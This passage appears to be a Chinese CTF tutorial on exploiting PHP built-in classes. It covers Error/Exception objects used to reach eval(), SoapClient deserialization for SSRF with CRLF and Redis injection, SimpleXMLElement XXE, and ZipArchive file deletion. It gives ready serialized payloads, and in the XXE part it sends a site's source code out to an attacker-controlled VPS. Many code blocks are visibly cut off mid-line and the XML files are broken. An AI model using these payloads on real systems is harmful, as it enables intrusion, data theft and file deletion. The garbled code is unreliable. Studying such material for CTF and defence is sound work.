POC如下：
    syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
               if(!preg_match("/\syc, $match)){
                   eval($this->syc);
               } else {
                   die("Try Hard !!");
               }
            }
        }
    }
    $str = "?>";
    /* 
    或使用[~(取反)][!%FF]的形式，
    即: $str = "?>";    
    $str = "?>"; 
    */
    $a=new Error($str,1);$b=new Error($str,2);
    $c = new SYCLOVER();
    $c->syc = $a;
    $c->lover = $b;
    echo(urlencode(serialize($c)));
    ?>
这里 `$str = "?>";` 中为什么要在前面加上一个
`?>` 呢？因为 `Exception` 类与 `Error` 的 `__toString`
方法在eval()函数中输出的结果是不可能控的，即输出的报错信息中，payload前面还有一段杂乱信息“Error: ”：
    Error: payload in /usercode/file.php:2
    Stack trace:
    #0 {main}
进入eval()函数会类似于：`eval("...Error: ")`。所以我们要用 `?>` 来闭合一下，即
`eval("...Error: ?>")`，这样我们的payload便能顺利执行了。
生成的payload如下：
    O%3A8%3A%22SYCLOVER%22%3A2%3A%7Bs%3A3%3A%22syc%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A20%3A%22%3F%3E%3C%3F%3Dinclude%7E%D0%99%93%9E%98%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A19%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7Ds%3A5%3A%22lover%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A20%3A%22%3F%3E%3C%3F%3Dinclude%7E%D0%99%93%9E%98%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A2%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A19%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D%7D
执行便可得到flag：
## 使用 SoapClient 类进行 SSRF
###  SoapClient 类
PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。
类摘要如下：
    SoapClient {
        /* 方法 */
        public __construct ( string|null $wsdl , array $options = [] )
        public __call ( string $name , array $args ) : mixed
        public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null
        public __getCookies ( ) : array
        public __getFunctions ( ) : array|null
        public __getLastRequest ( ) : string|null
        public __getLastRequestHeaders ( ) : string|null
        public __getLastResponse ( ) : string|null
        public __getLastResponseHeaders ( ) : string|null
        public __getTypes ( ) : array|null
        public __setCookie ( string $name , string|null $value = null ) : void
        public __setLocation ( string $location = "" ) : string|null
        public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool
        public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &$outputHeaders = null ) : mixed
    }
可以看到，该内置类有一个 `__call` 方法，当 `__call` 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 `__call`
方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。
该类的构造函数如下：
    public SoapClient :: SoapClient(mixed $wsdl [，array $options ])
  * 第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。
  * 第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。
###  使用 SoapClient 类进行 SSRF
知道上述两个参数的含义后，就很容易构造出SSRF的利用Payload了。我们可以设置第一个参数为null，然后第二个参数的location选项设置为target_url。
    'http://47.xxx.xxx.72:2333/aaa', 'uri'=>'http://47.xxx.xxx.72:2333'));
    $b = serialize($a);
    echo $b;
    $c = unserialize($b);
    $c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
    ?>
首先在47.xxx.xxx.72上面起个监听：
然后执行上述代码，如下图所示成功触发SSRF，47.xxx.xxx.72上面收到了请求信息：
但是，由于它仅限于HTTP/HTTPS协议，所以用处不是很大。而如果这里HTTP头部还存在CRLF漏洞的话，但我们则可以通过SSRF+CRLF，插入任意的HTTP头。
如下测试代码，我们在HTTP头中插入一个cookie：
     $target, 'user_agent' => "WHOAMI\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4", 'uri' => 'test'));
    $b = serialize($a);
    echo $b;
    $c = unserialize($b);
    $c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
    ?>
执行代码后，如下图所示，成功在HTTP头中插入了一个我们自定义的cookie：
可以再去drops回顾一下如何通过HTTP协议去攻击Redis的：[Trying to hack Redis via HTTP
requests](http://wooyun.jozxing.cc/static/drops/papers-3062.html)
如下测试代码：
     $target, 'uri' => 'hello^^'.$poc.'^^hello'));
    $b = serialize($a);
    $b = str_replace('^^',"\n\r",$b); 
    echo $b;
    $c = unserialize($b);
    $c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
    ?>
执行代码后，如下图所示，成功插入了Redis命令：
这样我们就可以利用HTTP协议去攻击Redis了。
对于如何发送POST的数据包，这里面还有一个坑，就是 `Content-Type` 的设置，因为我们要提交的是POST数据，所以 `Content-Type` 的值我们要设置为 `application/x-www-form-urlencoded`，这里如何修改 `Content-Type`
的值呢？由于 `Content-Type` 在 `User-Agent` 的下面，所以我们可以通过 `SoapClient` 来设置 `User-Agent` ，将原来的 `Content-Type` 挤下去，从而再插入一个新的 `Content-Type` 。
测试代码如下：
     $target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_data).'^^^^'.$post_data,'uri'=>'test'));
    $b = serialize($a);
    $b = str_replace('^^',"\n\r",$b);
    echo $b;
    $c = unserialize($b);
    $c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
    ?>
执行代码后，如下图所示，成功发送POST数据：
###  bestphp’s revenge
bestphp’s revenge 这道题利用的就是这个点，即对 SoapClient 类进行反序列化触发 SSRF，并配合CRLF构造payload。
进入题目，给出源码：
扫描目录发现flag.php：
可见当REMOTE_ADDR等于127.0.0.1时，就会在session中插入flag，就能得到flag。很明显了，要利用ssrf。
但是这里并没有明显的ssrf利用点，所以我们想到利用PHP原生类SoapClient触发反序列化导致SSRF。并且，由于flag会被插入到session中，所以我们就一定需要携带一个cookie即PHPSESSID去访问它来生成这个session文件。
写出最后的POC：
     $target,
        'user_agent' => "N0rth3ty\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\r\n",
        'uri' => "123"));
    $payload = urlencode(serialize($attack));
    echo $payload;
生成payload：
    O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A56%3A%22N0rth3ty%0D%0ACookie%3A+PHPSESSID%3Dtcjr6nadpk3md7jbgioa6elfk4%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
这里这个POC就是利用CRLF伪造本地请求SSRF去访问flag.php，并将得到的flag结果保存在cookie为
`PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4` 的session中。
然后，我们就要想办法反序列化这个对象，但这里有没有反序列化点，那么我们怎么办呢？我们在题目源码中发现了session_start();，很明显，我们可以用session反序列化漏洞。但是如果想要利用session反序列化漏洞的话，我们必须要有
`ini_set()` 这个函数来更改 `session.serialize_handler`
的值，将session反序列化引擎修改为其他的引擎，本来应该使用ini_set()这个函数的，但是这个函数不接受数组，所以就不行了。于是我们就用session_start()函数来代替，即构造
`session_start(serialize_handler=php_serialize)` 就行了。我们可以利用题目中的
`call_user_func($_GET['f'], $_POST);`
函数，传入GET：/?f=session_start、POST：serialize_handler=php_serialize，实现
`session_start(serialize_handler=php_serialize)`
的调用来修改此页面的序列化引擎为php_serialize。
所以，我们第一次传值先注入上面POC生成的payload创建并得到我们的session：
此时，我们成功将我们php原生类SoapClient构造的payload传入了 `PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4`
的session中，当页面重新加载时，就会自动将其反序列化。但此时还不会触发SSRF，需要触发 `__call`
方法来造成SSRF，该方法在访问对象中一个不存在的方法时会被自动调用，所以单纯反序列化还不行，我们还需要访问该对象中一个不存在的方法，这里就用到了如下这段代码：
    $a = array(reset($_SESSION), 'welcome_to_the_lctf2018');
    call_user_func($b, $a);
我们可以利用extract函数将变量b覆盖为call_user_func，这样，就成了：
    call_user_func(call_user_func, array(reset($_SESSION), 'welcome_to_the_lctf2018'));
call_user_func()函数有一个特性，就是当只传入一个数组时，可以用call_user_func()来调用一个类里面的方法，call_user_func()会将这个数组中的第一个值当做类名，第二个值当做方法名。
这样也就是会访问我们构造的session对象中的welcome_to_the_lctf2018方法，而welcome_to_the_lctf2018方法不存在，就会触发
`__call` 方法，造成ssrf去访问flag.php。
所以我们第二次传参如下：
最后，我们第三次传参，用我们POC里面自己设置的cookie（`PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4`）去访问这个页面，`var_dump($_SESSION);`
会将 `PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4` 的这个session内容输出出来，即可得到flag：
## 使用 SimpleXMLElement 类进行 XXE
SimpleXMLElement 这个内置类用于解析 XML 文档中的元素。
###  SimpleXMLElement 类
官方文档中对于SimpleXMLElement 类的构造方法 `SimpleXMLElement::__construct` 的定义如下：
可以看到通过设置第三个参数 data_is_url 为 `true`，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为`2`即可。第一个参数
data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。
这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。
###  [SUCTF 2018]Homework
进入题目，随便注册一个账号，登录作业平台。看到一个 `calc` 计算器类的代码。有两个按钮，一个用于调用 `calc`
类实现两位数的四则运算。另一个用于上传文件，提交代码。
`calc` 计算器类的代码为：
我们点击calc按钮，计算2+2=4，我们观察url处的参数，再结合`calc`计算器类的代码可知module为调用的类，args为类的构造方法的参数：
所以我们可以通过这种形式调用PHP中的内置类。这里我们通过调用 SimpleXMLElement 这个内置类来构造 XXE。
首先，我们在vps（47.xxx.xxx.72）上构造如下evil.xml、send.xml和send.php这三个文件。
evil.xml：
    %remote;
    %all;
    %send;
    ]>
send.xml：
    ">
send.php：
然后在url中构造如下：
    /show.php?module=SimpleXMLElement&args[]=http://47.xxx.xxx.72/evil.xml&args[]=2&args[]=true
这样目标主机就能先加载我们vps上的evil.xml，再加载send.xml。
如下图所示，成功将网站的源码以base64编码的形式读取并带出到result.txt中：
后续解题过程就不写了。
## 使用 ZipArchive 类来删除文件
###  ZipArchive 类
PHP ZipArchive类是PHP的一个原生类，它是在PHP 5.20之后引入的。ZipArchive类可以对文件进行压缩与解压缩处理。
下面列举几个常见的类方法：
  * [`ZipArchive::addEmptyDir`](https://www.php.net/manual/zh/ziparchive.addemptydir.php)：添加一个新的文件目录
  * [`ZipArchive::addFile`](https://www.php.net/manual/zh/ziparchive.addfile.php)：将文件添加到指定zip压缩包中
  * [`ZipArchive::addFromString`](https://www.php.net/manual/zh/ziparchive.addfromstring.php)：添加新的文件同时将内容添加进去
  * [`ZipArchive::close`](https://www.php.net/manual/zh/ziparchive.close.php)：关闭ziparchive
  * [`ZipArchive::extractTo`](https://www.php.net/manual/zh/ziparchive.extractto.php)：将压缩包解压
  * [`ZipArchive::open`](https://www.php.net/manual/zh/ziparchive.open.php)：打开一个zip压缩包
  * [`ZipArchive::deleteIndex`](https://www.php.net/manual/zh/ziparchive.deleteindex.php)：删除压缩包中的某一个文件，如：deleteIndex(0)代表删除第一个文件
  * [`ZipArchive::deleteName`](https://www.php.net/manual/zh/ziparchive.deletename.php)：删除压缩包中的某一个文件名称，同时也将文件删除
  * ……
我们来重点看看 `ZipArchive::open` 方法：
    ZipArchive::open(string $filename, int $flags=0)
该方法用来打开一个新的或现有的zip存档以进行读取，写入或修改。
  * filename：要打开的ZIP存档的文件名。
  * flags：用于打开档案的模式。有以下几种模式： 
    * `ZipArchive::OVERWRITE`：总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖或删除。
    * `ZipArchive::CREATE`：如果不存在则创建一个zip压缩包。
    * `ZipArchive::RDONLY`：只读模式打开压缩包。
    * `ZipArchive::EXCL`：如果压缩包已经存在，则出错。
    * `ZipArchive::CHECKCONS`：对压缩包执行额外的一致性检查，如果失败则显示错误。
注意，如果设置flags参数的值为 `ZipArchive::OVERWRITE` 的话，可以把指定文件删除。这里我们跟进方法可以看到const
OVERWRITE = 8，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将flags赋值为8。
也就是说我们可以利用ZipArchive原生类调用open方法删除目标主机上的文件。下面我们来看一道CTF题目。
###  梦里花开牡丹亭
进入题目，给出源码：